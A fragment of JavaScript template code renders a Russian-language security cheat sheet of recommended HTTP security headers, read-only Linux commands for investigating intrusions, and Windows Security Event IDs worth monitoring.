  <h2 style="margin-top:26px">HTTP-заголовки безопасности</h2>${pre(`Strict-Transport-Security: max-age=31536000; includeSubDomains
Content-Security-Policy: default-src 'self'; frame-ancestors 'none'; object-src 'none'
X-Content-Type-Options: nosniff
Referrer-Policy: strict-origin-when-cross-origin
Permissions-Policy: camera=(), microphone=(), geolocation=()
Set-Cookie: session=…; Secure; HttpOnly; SameSite=Lax; Path=/`)}
  <h2 style="margin-top:26px">Команды для расследования</h2>${t(['Linux', 'Что показывает'], [['<code>last</code>, <code>lastb</code>', 'успешные и неудачные входы'], ['<code>journalctl -u ssh --since today</code>', 'журнал службы SSH'], ['<code>grep "Failed password" /var/log/auth.log</code>', 'попытки подбора пароля (Debian/Ubuntu)'], ['<code>ss -tunap</code>', 'открытые соединения и процессы'], ['<code>ps auxf</code>', 'дерево процессов'], ['<code>find / -mtime -1 -type f 2&gt;/dev/null</code>', 'файлы, изменённые за сутки'], ['<code>crontab -l</code>, <code>ls /etc/cron.*</code>', 'задания по расписанию — частое место закрепления']])}
  ${t(['Windows Event ID', 'Событие'], [['4624 / 4625', 'успешный / неудачный вход'], ['4672', 'вход с особыми привилегиями (администратор)'], ['4688', 'создан процесс (нужен аудит командной строки)'], ['4720', 'создана учётная запись'], ['4732', 'пользователь добавлен в локальную группу'], ['7045', 'установлена служба'], ['1102', 'очищен журнал безопасности']])}`;
}
